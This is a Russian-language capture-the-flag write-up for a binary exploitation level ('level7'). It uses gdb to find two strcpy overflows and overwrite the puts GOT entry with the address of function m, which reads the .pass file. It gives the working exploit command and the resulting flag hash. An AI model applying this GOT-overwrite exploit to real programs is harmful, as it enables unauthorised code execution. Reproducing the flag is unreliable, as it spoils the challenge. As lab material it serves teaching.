# Вызов 'strcpy', уязвимого к переполнению буфера
```
=> 0x80485a0 <main+127>:	call   0x80483e0 <strcpy@plt>

=> 0x80485bd <main+156>:	call   0x80483e0 <strcpy@plt>
```
# Программа читает файл '/home/user/level8/.pass' с помощью 'fopen' и записывает его в глобальную переменную с помощью 'fgets'
# Функция 'm' печатает эту переменную, но не вызывается в основной функции

# Итак, нам нужно вызвать функцию 'm' ПОСЛЕ вызова 'fgets'
# Это делается заменой 'put' GOT (найдено после вызова 'fgets')
```
=> 0x80485eb <main+202>:	call   0x80483c0 <fgets@plt>
0x80485f0 <main+207>:	mov    DWORD PTR [esp],0x8048703
0x80485f7 <main+214>:	call   0x8048400 <puts@plt>
```
# вызов 'm'

# Мы используем шаблон gdb create или search, чтобы найти, в каких регистрах смещения происходит перезапись

# Мы нашли смещение 20 для первого 'strcpy'
# Также, когда мы запускаем следующее

```
gdb> r $(python -c "print 'A'*24") 'BBBB'
```
# Первый 'strcpy' прошел успешно, а вторые - SEGV со следующими аргументами
```
Guessed arguments:
arg[0]: 0x41414141 ('AAAA')
arg[1]: 0xffffd8f0 ("BBBB")
```
# Это интересно, потому что это означает, что второй 'strcpy' попытался записать значение argv [2] ...
# в адрес, записанный в argv [1] [20-24]

# Затем нам нужно найти адрес 'Put @ got'
```
gdb> disass main
[...]
0x080485f7 <+214>:	call   0x8048400 <puts@plt>
[...]
gdb> disass 0x8048400
[...]
0x08048400 <+0>:	jmp    DWORD PTR ds:0x8049928
[...]
gdb> x 0x8049928
0x8049928 <puts@got.plt>:	0x08048406
```
# нам нужен адрес функции m
```
gdb> x m
0x80484f4 <m>:	0x83e58955
```
# Тогда нам просто нужно написать payload
$> ./level7 $(python -c "print 'A'*20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
>5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9

# ╮(￣_￣)╭